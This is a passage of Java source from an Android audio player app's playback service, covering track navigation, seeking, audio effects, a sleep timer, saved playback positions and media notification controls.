                                  globalBass.setEnabled(true);
                                  globalBass.setStrength((short) useBass);
                              } catch (Throwable ignored) {}
                          }

                          if (useVirt > 0) {
                              try {
                                  if (globalVirt == null) globalVirt = new Virtualizer(0, sessionId);
                                  globalVirt.setEnabled(true);
                                  globalVirt.setStrength((short) useVirt);
                              } catch (Throwable ignored) {}
                          }

                          if (volumeBoostLevel > 0) {
                              try {
                                  if (globalLoudness == null) globalLoudness = new LoudnessEnhancer(sessionId);
                                  globalLoudness.setTargetGain(volumeBoostLevel * 100);
                                  globalLoudness.setEnabled(true);
                              } catch (Throwable ignored) {}
                          }

                          syncEchoPlayer(echoDelay, echoVol, finalSpeed, targetPitch);
                      }
                  } catch (Throwable ignored) {}
              }

              public static void playAudioAtIndex(Context ctx, int index) {
                  Context appCtx = ctx.getApplicationContext();
                  if (index < 0 || index >= displayList.size()) return;
                  ensureMediaPlayer(appCtx);
                  ensureMediaSession(appCtx);
                  SharedPreferences prefs = getPrefs(appCtx);

                  AudioItem prev = getCurrentItem();
                  if (prev != null && mediaPlayer != null) {
                      try {
                          if (isPlaying || mediaPlayer.getCurrentPosition() > 0) {
                              prefs.edit().putInt("pos_" + prev.path, mediaPlayer.getCurrentPosition()).apply();
                          }
                      } catch (Throwable ignored) {}
                  }

                  if (index == currentIndex && mediaPlayer != null) {
                      try {
                          if (!mediaPlayer.isPlaying()) {
                              mediaPlayer.start();
                              applyVoiceAndSpeed();
                              isPlaying = true;
                              AudioItem curr = getCurrentItem();
                              if (curr != null) {
                                  String title = getTagsPrefs(appCtx).getString(curr.path + "_title", curr.name);
                                  lastStatusText = "Playing: " + title;
                              }
                              refreshForegroundNotification(appCtx);
                              notifyUi();
                          }
                      } catch (Throwable ignored) {}
                      return;
                  }

                  currentIndex = index;
                  AudioItem item = displayList.get(currentIndex);
                  getRecentPrefs(appCtx).edit().putBoolean(item.path, true).apply();

                  try {
                      stopEchoPlayer();
                      try { if (globalEq != null) { globalEq.release(); globalEq = null; } } catch (Throwable ignored) {}
                      try { if (globalBass != null) { globalBass.release(); globalBass = null; } } catch (Throwable ignored) {}
                      try { if (globalVirt != null) { globalVirt.release(); globalVirt = null; } } catch (Throwable ignored) {}
                      try { if (globalLoudness != null) { globalLoudness.release(); globalLoudness = null; } } catch (Throwable ignored) {}

                      mediaPlayer.reset();
                      mediaPlayer.setDataSource(item.path);
                      mediaPlayer.prepare();
                      mediaPlayer.setLooping(singleLoop);

                      int savedPos = prefs.getInt("pos_" + item.path, 0);
                      if (savedPos > 0 && savedPos < (mediaPlayer.getDuration() - 2000)) {
                          mediaPlayer.seekTo(savedPos);
                      }

                      mediaPlayer.start();
                      isPlaying = true;
                      String titleToDisplay = getTagsPrefs(appCtx).getString(item.path + "_title", item.name);
                      lastStatusText = "Playing: " + titleToDisplay;
                      abRepeatState = 0;

                      prefs.edit()
                              .putString("lastPlayingPath", item.path)
                              .putString("lastPlayingName", titleToDisplay)
                              .apply();

                      applyVoiceAndSpeed();
                      refreshForegroundNotification(appCtx);
                      notifyUi();
                  } catch (Throwable ignored) {}
              }

              public static void playNextTrack(Context ctx) {
                  if (displayList.isEmpty()) return;
                  if (currentIndex >= 0 && currentIndex < displayList.size() - 1) {
                      playAudioAtIndex(ctx, currentIndex + 1);
                  } else {
                      playAudioAtIndex(ctx, 0);
                  }
              }

              public static void playPreviousTrack(Context ctx) {
                  if (displayList.isEmpty()) return;
                  if (currentIndex > 0) {
                      playAudioAtIndex(ctx, currentIndex - 1);
                  } else {
                      playAudioAtIndex(ctx, 0);
                  }
              }

              public static void togglePlayPause(Context ctx) {
                  Context appCtx = ctx.getApplicationContext();
                  ensureMediaPlayer(appCtx);
                  ensureMediaSession(appCtx);
                  if (mediaPlayer == null) return;
                  try {
                      if (mediaPlayer.isPlaying()) {
                          mediaPlayer.pause();
                          try { if (echoPlayer != null && echoPlayer.isPlaying()) echoPlayer.pause(); } catch (Throwable ignored) {}
                          isPlaying = false;
                          AudioItem item = getCurrentItem();
                          if (item != null) {
                              String title = getTagsPrefs(appCtx).getString(item.path + "_title", item.name);
                              lastStatusText = "Paused: " + title;
                              getPrefs(appCtx).edit().putInt("pos_" + item.path, mediaPlayer.getCurrentPosition()).apply();
                          }
                          refreshForegroundNotification(appCtx);
                          notifyUi();
                      } else {
                          if (currentIndex == -1 && !displayList.isEmpty()) {
                              playAudioAtIndex(appCtx, 0);
                          } else if (getCurrentItem() == null) {
                              String lastPath = getPrefs(appCtx).getString("lastPlayingPath", "");
                              if (!lastPath.isEmpty() && new File(lastPath).exists()) {
                                  File lf = new File(lastPath);
                                  displayList.add(new AudioItem(lf.getName(), lastPath, lf.lastModified(), lf.length(), 0));
                                  playAudioAtIndex(appCtx, 0);
                              }
                          } else {
                              mediaPlayer.start();
                              applyVoiceAndSpeed();
                              isPlaying = true;
                              AudioItem item = getCurrentItem();
                              if (item != null) {
                                  String title = getTagsPrefs(appCtx).getString(item.path + "_title", item.name);
                                  lastStatusText = "Playing: " + title;
                              }
                              refreshForegroundNotification(appCtx);
                              notifyUi();
                          }
                      }
                  } catch (Throwable ignored) {}
              }

              public static void seekToPosition(Context ctx, int newPos) {
                  Context appCtx = ctx.getApplicationContext();
                  try {
                      if (mediaPlayer == null) return;
                      int dur = mediaPlayer.getDuration();
                      if (dur <= 0) return;
                      int clamped = Math.max(0, Math.min(dur, newPos));
                      mediaPlayer.seekTo(clamped);
                      if (isPlaying) applyVoiceAndSpeed();
                      AudioItem item = getCurrentItem();
                      if (item != null) {
                          getPrefs(appCtx).edit().putInt("pos_" + item.path, clamped).apply();
                      }
                      refreshForegroundNotification(appCtx);
                      notifyUi();
                  } catch (Throwable ignored) {}
              }

              public static void seekAndUpdate(Context ctx, int change) {
                  try {
                      if (mediaPlayer == null) return;
                      seekToPosition(ctx, mediaPlayer.getCurrentPosition() + change);
                  } catch (Throwable ignored) {}
              }

              public static void stopPlaybackAndService(Context ctx) {
                  Context appCtx = ctx.getApplicationContext();
                  try {
                      if (mediaPlayer != null) {
                          if (mediaPlayer.isPlaying()) mediaPlayer.stop();
                          mediaPlayer.reset();
                      }
                      stopEchoPlayer();
                      isPlaying = false;
                      lastStatusText = "Playback Stopped";
                      NotificationManager nm = (NotificationManager) appCtx.getSystemService(Context.NOTIFICATION_SERVICE);
                      if (nm != null) nm.cancel(NOTIFICATION_ID);
                      if (mediaSession != null) {
                          mediaSession.setActive(false);
                      }
                      if (instance != null) {
                          instance.stopForeground(Service.STOP_FOREGROUND_REMOVE);
                          instance.stopSelf();
                      }
                      notifyUi();
                  } catch (Throwable ignored) {}
              }

              public static void setSleepTimer(final Context ctx, int mins) {
                  final Context appCtx = ctx.getApplicationContext();
                  if (sleepTimerRunnable != null) {
                      sleepTimerHandler.removeCallbacks(sleepTimerRunnable);
                      sleepTimerRunnable = null;
                  }
                  if (mins > 0) {
                      sleepTimerRunnable = () -> {
                          if (isPlaying && mediaPlayer != null) {
                              togglePlayPause(appCtx);
                              Toast.makeText(appCtx, "Sleep Timer: Audio Paused", Toast.LENGTH_LONG).show();
                          }
                      };
                      sleepTimerHandler.postDelayed(sleepTimerRunnable, mins * 60000L);
                      Toast.makeText(ctx, "Timer set for " + mins + " minutes", Toast.LENGTH_SHORT).show();
                  } else {
                      Toast.makeText(ctx, "Sleep Timer turned OFF", Toast.LENGTH_SHORT).show();
                  }
              }

              public static void refreshForegroundNotification(Context ctx) {
                  Context appCtx = ctx.getApplicationContext();
                  try {
                      ensureMediaSession(appCtx);
                      if (isPlaying) {
                          if (instance != null) {
                              Notification notif = buildNotification(instance, getCurrentItem(), true);
                              instance.startForegroundCompat(notif);
                          } else {
                              Intent svcIntent = new Intent(appCtx, MediaPlaybackService.class);
                              svcIntent.setAction(ACTION_START_PLAYBACK);
                              if (Build.VERSION.SDK_INT >= 26) {
                                  appCtx.startForegroundService(svcIntent);
                              } else {
                                  appCtx.startService(svcIntent);
                              }
                          }
                      } else {
                          AudioItem item = getCurrentItem();
                          if (instance != null) {
                              instance.stopForeground(Service.STOP_FOREGROUND_DETACH);
                          }
                          if (item != null) {
                              NotificationManager nm = (NotificationManager) appCtx.getSystemService(Context.NOTIFICATION_SERVICE);
                              if (nm != null) {
                                  nm.notify(NOTIFICATION_ID, buildNotification(appCtx, item, false));
                              }
                          }
                      }
                  } catch (Throwable ignored) {}
              }

              private static PendingIntent createActionPendingIntent(Context ctx, int requestCode, String action) {
                  Intent intent = new Intent(ctx.getApplicationContext(), MediaControlReceiver.class);
                  intent.setAction(action);
                  int flags = PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE;
                  return PendingIntent.getBroadcast(ctx.getApplicationContext(), requestCode, intent, flags);
              }

              public static Notification buildNotification(Context ctx, AudioItem item, boolean isPlay) {
                  createNotificationChannel(ctx);
                  ensureMediaSession(ctx);

                  Notification.Builder builder = (Build.VERSION.SDK_INT >= 26)
                          ? new Notification.Builder(ctx, CHANNEL_ID)
                          : new Notification.Builder(ctx);

                  Intent openIntent = new Intent(ctx, MainActivity.class);
                  openIntent.setFlags(Intent.FLAG_ACTIVITY_SINGLE_TOP | Intent.FLAG_ACTIVITY_CLEAR_TOP);
                  PendingIntent piOpen = PendingIntent.getActivity(
                          ctx, 0, openIntent, PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE);

                  PendingIntent piPrev = createActionPendingIntent(ctx, 1, ACTION_PREV);
                  PendingIntent piRewind = createActionPendingIntent(ctx, 5, ACTION_REWIND);
                  PendingIntent piPlay = createActionPendingIntent(ctx, 2, ACTION_PLAY);
                  PendingIntent piForward = createActionPendingIntent(ctx, 6, ACTION_FORWARD);
                  PendingIntent piNext = createActionPendingIntent(ctx, 3, ACTION_NEXT);
                  PendingIntent piClose = createActionPendingIntent(ctx, 4, ACTION_CLOSE);

                  String titleToDisplay = (item != null)
                          ? getTagsPrefs(ctx).getString(item.path + "_title", item.name)
                          : "MJ Audio Player";

                  builder.setContentTitle(titleToDisplay)
                          .setContentText("MJ Audio Player")
                          .setSmallIcon(R.drawable.ic_stat_music)
                          .setContentIntent(piOpen)
                          .setOngoing(isPlay)
                          .setVisibility(Notification.VISIBILITY_PUBLIC)
                          .addAction(android.R.drawable.ic_media_previous, "Prev", piPrev)
                          .addAction(android.R.drawable.ic_media_rew, "Rewind", piRewind)
                          .addAction(isPlay ? android.R.drawable.ic_media_pause : android.R.drawable.ic_media_play,
                                  isPlay ? "Pause" : "Play", piPlay)
                          .addAction(android.R.drawable.ic_media_ff, "Forward", piForward)
                          .addAction(android.R.drawable.ic_media_next, "Next", piNext)
                          .addAction(android.R.drawable.ic_menu_close_clear_cancel, "Close", piClose);

                  try {
                      Notification.MediaStyle style = new Notification.MediaStyle();
                      style.setShowActionsInCompactView(1, 2, 3);
                      if (Build.VERSION.SDK_INT >= 21 && mediaSession != null) {
                          style.setMediaSession(mediaSession.getSessionToken());

                          long dur = 0;
                          long pos = 0;
                          try {
                              if (mediaPlayer != null) {
                                  dur = mediaPlayer.getDuration();
                                  pos = mediaPlayer.getCurrentPosition();
                              }
                          } catch (Throwable ignored) {}

                          MediaMetadata.Builder metaBuilder = new MediaMetadata.Builder()
                                  .putString(MediaMetadata.METADATA_KEY_TITLE, titleToDisplay)
                                  .putString(MediaMetadata.METADATA_KEY_ARTIST, "MJ Audio Player");
                          if (dur > 0) {
                              metaBuilder.putLong(MediaMetadata.METADATA_KEY_DURATION, dur);
                          }
                          mediaSession.setMetadata(metaBuilder.build());

                          PlaybackState.Builder stateBuilder = new PlaybackState.Builder();
                          int state = isPlay ? PlaybackState.STATE_PLAYING : PlaybackState.STATE_PAUSED;
                          stateBuilder.setState(state, pos, isPlay ? currentPlaybackSpeed : 0f);
                          stateBuilder.setActions(
                                  PlaybackState.ACTION_PLAY
                                          | PlaybackState.ACTION_PAUSE
                                          | PlaybackState.ACTION_PLAY_PAUSE
                                          | PlaybackState.ACTION_SKIP_TO_NEXT
                                          | PlaybackState.ACTION_SKIP_TO_PREVIOUS
                                          | PlaybackState.ACTION_FAST_FORWARD
                                          | PlaybackState.ACTION_REWIND
                                          | PlaybackState.ACTION_SEEK_TO
                                          | PlaybackState.ACTION_STOP
                          );
                          stateBuilder.addCustomAction(new PlaybackState.CustomAction.Builder(
                                  CUSTOM_ACTION_REWIND, "Rewind", android.R.drawable.ic_media_rew).build());
                          stateBuilder.addCustomAction(new PlaybackState.CustomAction.Builder(
                                  CUSTOM_ACTION_FORWARD, "Forward", android.R.drawable.ic_media_ff).build());
                          stateBuilder.addCustomAction(new PlaybackState.CustomAction.Builder(
                                  CUSTOM_ACTION_CLOSE, "Close", android.R.drawable.ic_menu_close_clear_cancel).build());
                          mediaSession.setPlaybackState(stateBuilder.build());
                      }
                      builder.setStyle(style);
                  } catch (Throwable ignored) {}

                  return builder.build();
              }
          }
